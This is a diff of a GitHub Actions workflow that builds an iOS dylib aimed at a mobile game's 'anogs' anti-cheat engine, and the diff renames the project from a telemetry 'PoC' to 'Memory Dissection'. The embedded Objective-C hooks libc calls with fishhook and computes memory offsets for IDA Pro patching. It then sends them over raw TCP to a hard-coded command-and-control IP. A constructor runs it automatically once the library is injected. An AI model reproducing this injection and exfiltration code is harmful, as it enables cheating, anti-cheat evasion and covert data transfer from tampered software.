@@ -1,4 +1,4 @@
-name: Security Audit - anogs Telemetry Interceptor PoC
+name: Security Audit - Memory Dissection PoC
 
 on:
   push:
@@ -7,7 +7,7 @@ on:
 
 jobs:
   build_poc:
-    name: Compile Dylib Payload
+    name: Compile Dissection Payload
     runs-on: macos-latest
 
     steps:
@@ -29,32 +29,16 @@ jobs:
           #import <dlfcn.h>
           #include "fishhook.h"
 
-          /**
-           * ========================================================
-           * 🛡️ VULNERABILITY PoC: ANTI-CHEAT TELEMETRY INTERCEPTION
-           * 👨‍💻 RESEARCHER: MASOUD (NASIRIYAH)
-           * 🎯 TARGET ENGINE: anogs.dylib
-           * * DESCRIPTION:
-           * This payload demonstrates how an attacker can monitor the
-           * Anti-Cheat engine in real-time, extracting exact memory
-           * offsets (for IDA Pro patching) by hooking libc functions
-           * and utilizing raw TCP sockets to bypass Apple's ATS filters.
-           * ========================================================
-           */
-
           // ⚠️ C2 Server Configuration (Masoud RDP)
           #define C2_IP "44.192.33.117"
           #define C2_PORT 8080
 
-          // Original function pointers
+          // Pointers for original functions
           static int (*orig_access)(const char *path, int amode);
           static int (*orig_stat)(const char *path, struct stat *buf);
           static void* (*orig_dlsym)(void* handle, const char* symbol);
 
-          /**
-           * @brief Sends intercepted telemetry to the C2 Server via Raw TCP.
-           * Uses dispatch_async to prevent blocking the game's main thread.
-           */
+          // إرسال البيانات للسيرفر عبر TCP
           void ExfiltrateTelemetry(NSDictionary *telemetryData) {
               dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
                   NSData *jsonData = [NSJSONSerialization dataWithJSONObject:telemetryData options:0 error:nil];
@@ -68,7 +52,6 @@ jobs:
                   server_addr.sin_port = htons(C2_PORT);
                   inet_pton(AF_INET, C2_IP, &server_addr.sin_addr);
 
-                  // 1-second timeout to prevent lag spikes in the host app
                   struct timeval timeout = {1, 0}; 
                   setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
 
@@ -79,25 +62,32 @@ jobs:
               });
           }
 
-          /**
-           * @brief Resolves the caller's address and calculates the IDA offset.
-           */
+          // 🔍 تشريح الذاكرة: استخراج هوية الملف والأوفست الدقيق لـ IDA Pro
           void AnalyzeAndExfiltrate(const char* function_name, const char* target_param) {
+              // 1. الحصول على عنوان الرجوع (مكان استدعاء الدالة في الذاكرة)
               void* ret_addr = __builtin_return_address(0);
               Dl_info info;
               
+              // 2. سؤال النظام: لمن يعود هذا العنوان؟
               if (dladdr(ret_addr, &info) && info.dli_fname) {
-                  NSString *caller = [[NSString stringWithUTF8String:info.dli_fname] lowercaseString];
+                  // استخراج المسار الكامل للملف
+                  NSString *fullPath = [NSString stringWithUTF8String:info.dli_fname];
+                  // استخراج اسم الملف فقط (anogs أو ShadowTrackerExtra)
+                  NSString *moduleName = [fullPath lastPathComponent];
+                  NSString *callerLower = [moduleName lowercaseString];
                   
-                  // Filter: Only intercept if the caller is the Anti-Cheat engine or main game
-                  if ([caller containsString:@"anogs"] || [caller containsString:@"shadowtracker"]) {
-                      // Calculate exact binary offset: Execution Address - Base Address
+                  // 3. فلتر المراقبة: مراقبة الحماية واللعبة فقط
+                  if ([callerLower containsString:@"anogs"] || [callerLower containsString:@"shadowtracker"]) {
+                      
+                      // 🔥 السحر هنا: حساب الأوفست الصافي (IDA Offset)
+                      // (عنوان التنفيذ الحالي) ناقص (عنوان بداية الملف بالذاكرة)
                       uintptr_t offset = (uintptr_t)ret_addr - (uintptr_t)info.dli_fbase;
                       
                       ExfiltrateTelemetry(@{
                           @"func": [NSString stringWithUTF8String:function_name],
-                          @"offset": [NSString stringWithFormat:@"0x%lx", offset],
-                          @"target": target_param ? [NSString stringWithUTF8String:target_param] : @"NULL"
+                          @"offset": [NSString stringWithFormat:@"0x%lx", offset], // إرسال الأوفست بصيغة Hex
+                          @"target": target_param ? [NSString stringWithUTF8String:target_param] : @"NULL",
+                          @"caller": moduleName // هوية الملف المستدعي
                       });
                   }
               }
@@ -125,10 +115,10 @@ jobs:
           __attribute__((constructor))
           static void InjectPayload() {
               dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-                  // Send initialization ping
-                  ExfiltrateTelemetry(@{@"func": @"RADAR_INIT", @"offset": @"0x0", @"target": @"Connection Established"});
+                  // نبضة البداية للتأكد من ربط الرادار
+                  ExfiltrateTelemetry(@{@"func": @"RADAR_INIT", @"offset": @"0x0", @"target": @"Connection Established", @"caller": @"System"});
 
-                  // Apply Fishhook
+                  // زرع الخطافات
                   struct rebinding hooks[] = {
                       {"access", (void *)hk_access, (void **)&orig_access},
                       {"stat", (void *)hk_stat, (void **)&orig_stat},
@@ -143,12 +133,12 @@ jobs:
         run: |
           clang++ -dynamiclib -std=c++11 -arch arm64 \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          jni/main.mm jni/fishhook.c -o Anogs-Telemetry-PoC.dylib \
+          jni/main.mm jni/fishhook.c -o Anogs-Dissection-PoC.dylib \
           -framework Foundation
-          strip -x Anogs-Telemetry-PoC.dylib
+          strip -x Anogs-Dissection-PoC.dylib
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Anogs-Telemetry-PoC
-          path: Anogs-Telemetry-PoC.dylib
+          name: Anogs-Dissection-PoC
+          path: Anogs-Dissection-PoC.dylib
